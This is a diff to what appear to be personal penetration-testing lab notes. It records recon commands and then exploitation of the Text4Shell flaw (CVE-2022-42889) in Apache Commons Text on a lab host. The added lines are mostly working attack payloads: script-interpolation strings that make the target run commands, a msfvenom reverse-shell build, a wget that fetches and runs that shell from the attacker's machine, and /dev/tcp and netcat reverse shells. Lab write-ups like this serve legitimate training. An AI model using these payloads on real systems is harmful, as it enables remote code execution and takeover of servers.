@@ -203,8 +203,29 @@ sudo nmap -sV -p 8080 --script "vuln" 192.168.190.150
 
 whatweb http://192.168.211.150:8080
 gobuster dir -u http://192.168.211.150 -w /usr/share/wordlists/dirb/common.txt
-feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt --url http://192.168.190.150:8080/search
+
+# want to look for words and directories in addition to common ones - this finds CHANGELOG - find Apache Commons Text 1.8 vuln 
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.190.150:8080
 gobuster dir -u http://192.168.211.150:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf
 
 ssh -i id_rsa john@192.168.190.150
+
+# text4 shell https://github.com/kljunowsky/CVE-2022-42889-text4shell
+# exploit - since there is no output, try pinging, that works
+# in burp: http://192.168.190.150:8080/search?query=id
+
+sudo tcpdump -i tun0 proto \\icmp
+${script:javascript:java.lang.Runtime.getRuntime().exec('ping -c3 192.168.45.234')}
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.234 LPORT=22 -f sh -o shell
+
+${script:javascript:java.lang.Runtime.getRuntime().exec("/bin/bash -c 'exec 5<>/dev/tcp/192.168.45.234/22;cat <&5 | while read line; do $line 2>&5 >&5; done'")
+
+${script:javascript:java.lang.Runtime.getRuntime().exec('wget http://192.168.45.234/shell -O /dev/shm/shell')
+
+${script:javascript:java.lang.Runtime.getRuntime().exec("sh /dev/shm/shell")
+
+${script:javascript:java.lang.Runtime.getRuntime().exec("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.234 22 >/tmp/f")
+rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+
 ```
